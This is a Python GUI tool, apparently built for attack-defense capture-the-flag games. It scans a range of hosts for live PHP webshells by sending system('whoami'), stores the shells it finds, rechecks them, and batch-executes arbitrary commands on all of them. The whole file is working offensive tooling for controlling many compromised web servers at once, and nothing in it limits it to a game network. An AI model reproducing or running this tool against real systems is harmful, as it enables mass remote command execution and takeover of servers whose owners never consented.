import PySimpleGUI as sg
import json
import requests
from datetime import datetime
import concurrent.futures
import threading

CONFIG_FILE = "webshells.json"
MAX_THREADS = 10

def init_config():
    """初始化配置文件"""
    try:
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {"webshells": []}

def save_config(config):
    """保存配置文件"""
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=2, default=str)

def create_layout():
    """创建主窗口布局"""
    menu_def = [['文件', ['退出']], ['管理', ['Webshell管理']]]
    
    return [
        [sg.Menu(menu_def)],
        [sg.Text('URL模板 (含X占位符):'), sg.Input(key='-URL_TEMPLATE-')],
        [sg.Text('请求方法:'), sg.Combo(['GET', 'POST'], default_value='GET', key='-METHOD-')],
        [sg.Text('命令参数名:'), sg.Input('cmd', key='-CMD_PARAM-')],
        [sg.Text('X范围'), 
         sg.Input('0', key='-START_X-', size=5), sg.Text('-'),
         sg.Input('255', key='-END_X-', size=5)],
        [sg.Text('端口:'), sg.Input('80', key='-PORT-', size=5)],
        [sg.Button('开始扫描', key='-SCAN-')],
        [sg.Multiline(size=(80, 10), key='-LOG-', disabled=True, autoscroll=True)],
        [sg.Text('状态:', key='-STATUS-')],
        [sg.Text('by RT886', text_color='black', font=('Arial', 8), justification='right', pad=(0, 5))]
    ]

def create_management_layout():
    """创建管理窗口布局"""
    headings = ['URL', '方法', '参数', '最后检测', '状态']
    return [
        [sg.Button('刷新', key='-REFRESH-'),
         sg.Button('添加', key='-ADD-'),
         sg.Button('删除选中', key='-DELETE-'),
         sg.Button('检测存活', key='-CHECK-'),
         sg.Button('批量执行命令', key='-BATCH-')],
        [sg.Table(
            values=[], 
            headings=headings,
            auto_size_columns=False,
            col_widths=[40, 10, 15, 15, 10],
            key='-TABLE-',
            enable_events=True,
            selected_row_colors='red on yellow',
            justification='left',
            expand_x=True,
            expand_y=True
        )],
        [sg.Multiline(
            size=(80, 10),
            key='-BATCH_LOG-',
            disabled=True,
            autoscroll=True,
            expand_x=True,
            right_click_menu=['', ['清空日志']]
        )],
        [sg.Text('by RT886', text_color='black', font=('Arial', 8), justification='right', pad=(0, 5))]
    ]

def execute_command(webshell, command):
    """执行单个Webshell命令"""
    try:
        method = webshell["method"].upper()
        param = webshell["param"]
        url = webshell["url"]
        
        if method == "GET":
            resp = requests.get(url, params={param: command}, timeout=5)
        elif method == "POST":
            resp = requests.post(url, data={param: command}, timeout=5)
        else:
            return {"status": "error", "result": "不支持的请求方法", "url": url}
        
        return {
            "status": "success" if resp.status_code == 200 else "error",
            "result": resp.text.strip()[:100] if resp.status_code == 200 else f"HTTP错误 {resp.status_code}",
            "url": url
        }
    except Exception as e:
        return {"status": "error", "result": f"请求失败: {str(e)}", "url": url}

def check_webshell_status(url, method, param):
    """检测Webshell状态"""
    test_cmd = "system('whoami');"
    try:
        result = execute_command({"url": url, "method": method, "param": param}, test_cmd)
        return {"status": "存活" if ("www-data" in result["result"]) or ("\\" in result["result"]) else "失效"}
    except:
        return {"status": "失效"}

def scan_webshells(url_template, method, param, start_x, end_x, window, port):
    """扫描Webshell"""
    found = []
    total = end_x - start_x + 1
    window.write_event_value(('-SCAN-PROGRESS', 0), (0, total))
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        for x in range(start_x, end_x + 1):
            url = url_template.replace("X", str(x)).replace("PORT", str(port))
            futures.append(executor.submit(
                execute_command,
                {"url": url, "method": method, "param": param},
                "system('whoami');"
            ))
        
        completed = 0
        for future in concurrent.futures.as_completed(futures):
            completed += 1
            result = future.result()
            window.write_event_value(('-SCAN-PROGRESS', completed), (completed, total))
            
            timestamp = datetime.now().strftime("%H:%M:%S")
            if ("www-data" in result["result"]) or ("\\" in result["result"]):
                found.append({
                    "url": result["url"],
                    "method": method,
                    "param": param,
                    "last_check": datetime.now().strftime("%Y-%m-%d %H:%M"),
                    "status": "存活"
                })
                log_msg = f"[{timestamp}] ✅ 存活 {result['url']} | 响应: {result['result'][:50]}..."
            else:
                log_msg = f"[{timestamp}] ❌ 失效 {result['url']} | 原因: {result['result'][:10]}..."
            
            window.write_event_value('-LOG-APPEND-', log_msg)
    
    window.write_event_value('-SCAN-COMPLETE-', {"total": total, "new": len(found)})
    config = init_config()
    config["webshells"].extend(found)
    config["webshells"] = list({ws["url"]: ws for ws in config["webshells"]}.values())
    save_config(config)

def main():
    config = init_config()
    layout = create_layout()
    main_window = sg.Window('AWD Webshell管理框架', layout, finalize=True, resizable=True)
    
    while True:
        event, values = main_window.read()
        
        if event in (sg.WIN_CLOSED, '退出'):
            break
        
        elif event == 'Webshell管理':
            mgmt_layout = create_management_layout()
            mgmt_window = sg.Window("Webshell管理器", mgmt_layout, finalize=True, resizable=True, size=(1200, 600))
            
            def update_table():
                """关键修复：强制刷新配置数据"""
                nonlocal config
                config = init_config()  # 强制从文件重新加载
                rows = [[ws["url"], ws["method"], ws["param"], 
                        ws.get("last_check", "-"), ws.get("status", "-")] 
                       for ws in config["webshells"]]
                mgmt_window["-TABLE-"].update(values=rows)
            
            update_table()
            
            while True:
                mgmt_event, mgmt_values = mgmt_window.read()
                
                if mgmt_event == sg.WIN_CLOSED:
                    break

                elif mgmt_event == '清空日志':
                    mgmt_window['-BATCH_LOG-'].update('')

                elif mgmt_event == '-REFRESH-':
                    update_table()

                elif mgmt_event == '-ADD-':
                    add_layout = [
                        [sg.Text("URL:"), sg.Input(key='-ADD_URL-')],
                        [sg.Text("Method:"), sg.Combo(['GET', 'POST'], key='-ADD_METHOD-')],
                        [sg.Text("Param:"), sg.Input(key='-ADD_PARAM-', default_text='cmd')],
                        [sg.Button('添加'), sg.Button('取消')]
                    ]
                    add_window = sg.Window('添加Webshell', add_layout, finalize=True)
                    
                    while True:
                        a_event, a_values = add_window.read()
                        if a_event in (sg.WIN_CLOSED, '取消'):
                            break
                        elif a_event == '添加':
                            new_ws = {
                                "url": a_values['-ADD_URL-'],
                                "method": a_values['-ADD_METHOD-'],
                                "param": a_values['-ADD_PARAM-'],
                                "last_check": "-",
                                "status": "-"
                            }
                            config["webshells"].append(new_ws)
                            save_config(config)
                            update_table()
                            break
                    add_window.close()

                elif mgmt_event == '-DELETE-':
                    selected_rows = sorted(mgmt_values['-TABLE-'], reverse=True)
                    if selected_rows:
                        valid_indices = [idx for idx in selected_rows if 0 <= idx < len(config["webshells"])]
                        for idx in valid_indices:
                            del config["webshells"][idx]
                        save_config(config)
                        update_table()

                elif mgmt_event == '-CHECK-':
                    def update_status():
                        webshells = config["webshells"]
                        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
                            futures = [executor.submit(check_webshell_status, ws["url"], ws["method"], ws["param"]) 
                                      for ws in webshells]
                            
                            for i, future in enumerate(futures):
                                result = future.result()
                                config["webshells"][i]["status"] = result["status"]
                                config["webshells"][i]["last_check"] = datetime.now().strftime("%Y-%m-%d %H:%M")
                        save_config(config)
                        update_table()
                    threading.Thread(target=update_status, daemon=True).start()

                elif mgmt_event == '-BATCH-':
                    command = sg.popup_get_text('输入命令', default_text="system('whoami');")
                    if command:
                        results = []
                        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
                            futures = [executor.submit(execute_command, ws, command) 
                                      for ws in config["webshells"]]
                            
                            for future in concurrent.futures.as_completed(futures):
                                result = future.result()
                                results.append(f"[{result['url']}] {result['result']}")
                        mgmt_window['-BATCH_LOG-'].update('\n'.join(results))
            
            mgmt_window.close()

        elif event == '-SCAN-':
            url_template = values['-URL_TEMPLATE-']
            method = values['-METHOD-']
            cmd_param = values['-CMD_PARAM-']
            start_x = int(values['-START_X-'])
            end_x = int(values['-END_X-'])
            port_str = values['-PORT-']
            
            try:
                port = int(port_str.strip()) if port_str else 80
                if not (1 <= port <= 65535 and 0 <= start_x <= 255 and 0 <= end_x <= 255 and start_x <= end_x):
                    raise ValueError
            except:
                sg.popup_error('参数错误：端口需1-65535，X范围0-255')
                continue
                
            if 'X' not in url_template:
                sg.popup_error('URL模板必须包含X占位符')
                continue
            
            main_window['-STATUS-'].update('正在扫描...')
            main_window['-LOG-'].update('')
            
            threading.Thread(
                target=scan_webshells,
                args=(url_template, method, cmd_param, start_x, end_x, main_window, port),
                daemon=True
            ).start()
            
        elif event == '-SCAN-PROGRESS':
            completed, total = values[event]
            main_window['-STATUS-'].update(f"进度：{completed}/{total}")
            
        elif event == '-SCAN-COMPLETE-':
            data = values[event]
            main_window['-STATUS-'].update(f"扫描完成：共检测{data['total']}个目标，发现{data['new']}个存活Webshell")
            main_window['-LOG-'].print(f"\n[扫描完成] 发现{data['new']}个有效Webshell\n")

        elif event == '-LOG-APPEND-':  # 新增日志处理事件
            log_msg = values[event]
            main_window['-LOG-'].print(log_msg)

    main_window.close()

if __name__ == "__main__":
    main()
